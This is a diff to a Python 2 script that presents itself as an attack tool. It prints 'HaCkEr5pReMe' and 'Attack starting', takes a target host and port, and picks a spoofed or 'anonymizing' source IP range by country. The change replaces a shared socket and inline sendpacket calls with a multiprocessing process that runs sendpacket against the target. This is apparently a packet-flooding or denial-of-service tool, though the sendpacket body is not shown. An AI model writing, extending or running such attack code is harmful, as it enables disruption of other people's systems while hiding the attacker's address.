@@ -19,9 +19,6 @@ destination = definetarget()
 targetport = defineporttarget()
 awnser_anonymizing = anonymizing_input(supcountries)
 
-cnt = 0
-silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-silva.connect((destination, targetport))
 
 if awnser_anonymizing in supcountries:
    useriprange = chooseiprange(awnser_anonymizing, supcountries)
@@ -31,8 +28,7 @@ if awnser_anonymizing in supcountries:
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'      
-   sendpacket(Ip_range, destination, targetport, silva)
-   
+
 if awnser_anonymizing == yourIP:
    Ip_range = yourIP
    time.sleep(5)
@@ -40,7 +36,6 @@ if awnser_anonymizing == yourIP:
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
-   sendpacket(Ip_range, destination, targetport, silva)
 
 if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
     Ip_range = awnser_anonymizing
@@ -49,7 +44,7 @@ if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:
     print 'HaCkEr5pReMe'
     print ''
     print 'Attack starting'
-    sendpacket(Ip_range, destination, targetport, silva)
+    
 
 
 if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
@@ -60,10 +55,13 @@ if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
         print 'HaCkEr5pReMe'
         print ''
         print 'Attack starting'
-        sendpacket(Ip_range, destination, targetport, silva)
+        
 
 
 
+p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destination, targetport))
+p.start()
+p.join()
 
 
 
